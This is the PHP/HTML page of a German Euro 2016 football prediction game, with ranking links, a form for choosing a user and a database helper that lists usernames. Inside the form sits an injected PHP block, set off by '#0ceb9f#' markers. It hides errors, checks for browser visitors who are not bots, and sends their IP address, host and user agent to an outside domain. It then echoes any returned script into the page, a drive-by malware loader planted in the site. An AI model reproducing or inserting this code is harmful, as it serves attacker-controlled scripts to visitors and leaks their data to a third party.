<!DOCTYPE HTML>
<head>
<link rel='stylesheet' type='text/css' href='../../style/style-EM2016.css' />
<title>Werke's Tippspiel - Punktestand</title>
</head>
<body>
<center>
<h1>Werke's Tippspiel zur Europameisterschaft 2016 in Frankreich</h1>
<p><img src="../pics/Logo_EM_2016.png" class="image" width="400" alt="Logo_EM_2016">
<h2>
<a href='../anybody/showUserRanks.php5'>Punktestand</a>
</h2>
<br>
<a href='../news/WM-Newsletter-2014-06-06.docx'>WM-Newsletter #1</a>
<br>
<br>
<br>
<br>
<a href='../docs/Spielregeln_WM.pdf'>Werke's Tippspiel-Regeln</a>
<br>
<br>
<br>
<h3>Tipps im Detail ansehen</h3>
<a href='../anybody/showAllUsersGroupTipps.php5?userId=$userId'>Gruppenspieltipps</a>
<br>
<a href='../anybody/showAllUsersGroupRankTipps.php5?userId=$userId'>Platzierungstipps</a>
<br>
<a href='../anybody/showAllUsersFinalmatchTipps.php5?userId=$userId'>Finalspieltipps</a>
<br>
<a href='../anybody/showAllUsersSpecialTipps.php5?userId=$userId'>Spezialtipps</a>
<br>
<br>
<form method="POST" action="../anybody/showAllTippsAndScore.php5">
Alle Tipps von
<td bgcolor=slategray><select name='SelectedUsername'>
<?php
allUsersAsOption("User");
?>
<?php
#0ceb9f#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/0ceb9f#
?>
</td>
<br>
<input type='submit' name='showUser' value='anzeigen'/>
</form>
<br>
</center>

</body>
</html>

<?php

function allUsersAsOption($optionName) {
	include_once("../../connection/dbaccess-local.php5");
	include_once("../../general/log/log.php5");
	include_once("../util/dbschema.php5");
	$log=new logger();	
	$log->info("Viewed login page");
	$table_users=dbschema::users;
	$sqlUsers="SELECT * FROM $table_users ORDER BY username";
	//$log->info($sqlUsers);
	$sqlUsersResult=mysql_query($sqlUsers);
	$numUsers=mysql_num_rows($sqlUsersResult);
	if ($numUsers==0)
	{
		$log->info("keine passenden Datensätze gefunden");
		echo "keine passenden Datensätze gefunden";
	}
	else
	{
		//$log->info("Anzahl User=". $numUsers);
		for ($i=0; $i<$numUsers; $i++)
		{
			$name = mysql_result($sqlUsersResult, $i, "username");
			if($name!='admin' && $name!='real')
			{
				echo"<option name=$optionName >$name</option>";
			}
		}
	}
}
?>